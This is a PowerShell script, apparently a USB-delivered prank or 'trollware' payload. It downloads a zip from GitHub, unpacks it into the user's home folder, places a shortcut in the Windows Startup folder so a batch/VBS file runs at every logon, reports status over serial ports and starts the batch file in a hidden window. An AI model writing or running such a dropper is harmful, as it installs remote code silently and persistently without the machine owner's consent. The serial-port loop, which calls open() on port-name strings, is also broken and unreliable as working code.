# Download and install
Set-Location $home
Invoke-WebRequest -Uri "https://github.com/smcbride-ca/G/raw/test/g.zip" -OutFile "GooseTrollware.zip"
Expand-Archive -Path "GooseTrollware.zip" -DestinationPath "GooseTrollware" -Force

$gloc="GooseTrollware\GooseTrollwareLegit.bat"

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\GooseTrollwareLegit.lnk")
$Shortcut.TargetPath = "$home\GooseTrollware\GooseTrollwareLegit.vbs"
$Shortcut.Arguments = "`"$home\GooseTrollware\GooseTrollwareLegit.bat`""
$Shortcut.Save()

$portNames = [System.IO.Ports.SerialPort]::getportnames()

# Ping 8.8.8.8
if (Test-Connection -ComputerName 8.8.8.8 -Count 5 -Quiet) {
    # If the ping is successful, run your code here
    foreach ($port in $portNames) {
        $port.open()
        $port.WriteLine("SUCCESS")
        $port.close()
    }
    # Your code goes here
} else {
    foreach ($port in $portNames) {
        $port.open()
        $port.WriteLine("FAILED")
        $port.close()
    }
}

# cp "GooseTrollware\GooseTrollwareLegit.lnk" "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"

# And finally we start it
Start-Sleep 1
Start-Process "$gloc" -WindowStyle Hidden
